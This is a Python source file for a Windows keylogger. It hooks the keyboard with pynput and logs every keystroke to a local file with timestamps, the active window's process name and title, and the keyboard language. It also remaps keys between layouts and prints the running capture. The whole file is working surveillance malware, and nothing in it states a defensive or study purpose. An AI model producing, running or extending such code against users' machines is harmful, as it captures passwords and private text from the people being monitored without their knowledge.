from pynput.keyboard import Key, Listener
import win32gui, win32process
import threading
import logging
import ctypes
import psutil
import json

class Keylogger:
    def __init__(self, filename: str = "keystrokes"):
        logging.basicConfig(filename=f"{filename}.log", format="%(asctime)s - %(message)s",
                            datefmt="%d/%m/%y - %H:%M:%S", level=logging.INFO, encoding="utf-8")
        self.initial_keyboard_language = self.get_keyboard_language()[0]
        self.shift_on = False
        self.log = ""

    def load_data(self) -> dict:
        with open("data.json", "r", encoding="utf-8") as file:
            data = json.load(file)
        return data
    
    def append_to_log(self, curr_key):
        logging.info("%s | [%s] - [ %s ]", curr_key, self.get_keyboard_language()[1], self.get_current_window())

    def process_keypress(self, key, curr_key=""):
        try:
            curr_key = key.char
        except AttributeError:
                # self.append_to_log(f"[ {key.name.upper()} ]")
                if key.name in ["shift", "shift_r"]:
                    self.shift_on = True
                elif key.name == "enter":
                    curr_key = "[ENTER]\n"
                elif key.name == "space":
                    curr_key = " "
        else:
            self.current_keyboard_language = self.get_keyboard_language()[0]
            for lang in self.load_data()["languages"]["layouts"]:
                if lang in self.current_keyboard_language and lang not in self.initial_keyboard_language:
                    curr_key = self.keyboard_layout(curr_key)
            curr_key = self.is_capslock_on(curr_key)
            if curr_key not in (" ", "", "\n", None):
                self.append_to_log(f"[ { curr_key } ]")
        finally:
            if curr_key != None:
                self.log += curr_key
        print(self.log)

    def process_keyrelease(self, key):
        if key in [Key.shift, Key.shift_r]:
            self.shift_on = False
        if key == Key.delete:
            return False

    def is_capslock_on(self, curr_key) -> str:
        capslock_state = bool(ctypes.WinDLL("User32.dll").GetKeyState(0x14))
        return curr_key.lower() if capslock_state and self.shift_on else curr_key.upper() if capslock_state else curr_key

    def get_current_window(self) -> str:
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)
        return f"{psutil.Process(pid[-1]).name()} | {win32gui.GetWindowText(hwnd)}"

    def get_keyboard_language(self) -> list[str]:
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        curr_window = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
        klid = user32.GetKeyboardLayout(thread_id)
        lid = klid & (2 ** 16 - 1)
        lid_hex = hex(lid)
        try:
            language = self.load_data()["languages"]["ID"][str(lid_hex)]
        except KeyError:
            language = self.load_data()["languages"]["ID"]["0x409"]
        return language

    def keyboard_layout(self, curr_key) -> str:
        layout = ("".join(self.load_data()["languages"]["layouts"][self.initial_keyboard_language]),
                  "".join(self.load_data()["languages"]["layouts"][self.current_keyboard_language]))
        layouts_mapping = dict([(ord(a), ord(b)) for (a, b) in zip(*layout)])
        if ord(curr_key) in layouts_mapping:
            curr_key = chr(layouts_mapping[ord(curr_key)])
        return curr_key
    
    def __call__(self):
        listener = Listener(on_press=self.process_keypress, on_release=self.process_keyrelease)
        listener.start()
        listener.join()